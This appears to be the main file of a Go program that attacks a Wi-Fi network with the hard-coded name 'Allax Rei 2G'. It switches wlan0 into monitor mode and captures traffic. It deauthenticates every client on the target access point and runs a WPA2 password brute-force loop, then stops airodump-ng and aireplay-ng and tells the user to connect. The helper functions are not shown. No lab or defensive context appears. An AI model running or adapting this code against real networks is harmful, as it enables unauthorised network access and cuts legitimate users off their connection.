package main

import (
	"fmt"
	"os"
)

const ESSID = "Allax Rei 2G"
const NET_INTERFACE = "wlan0"

var ROOT_PASS string

func init() {
	ROOT_PASS = os.Getenv("ROOT_PASSWORD")
}

func main() {
	checkAvailableInterfaces()

	setInterfaceToMonitorMode(NET_INTERFACE)

	macAddress, channel := getTargetInterfaceFromESSID(ESSID, NET_INTERFACE)

	type T = struct{}
	wait := make(chan T)

	go func() {
		analyzePackets(macAddress, channel, NET_INTERFACE)
		<-wait
	}()

	go func() {
		deauthEveryone(macAddress, channel, NET_INTERFACE)
		<-wait
	}()

	runWPA2BruteForceInLoop()
	wait <- struct{}{}

	fmt.Println("killing analyze and deauth pids...")
	execCmd("pkill -f 'airodump-ng'")
	execCmd("pkill -f 'aireplay-ng'")

	fmt.Println("if works go on and connect to the network!\nstop monitor mode => sudo airmon-ng stop wlan0\nsudo service NetworkManager restart")
}
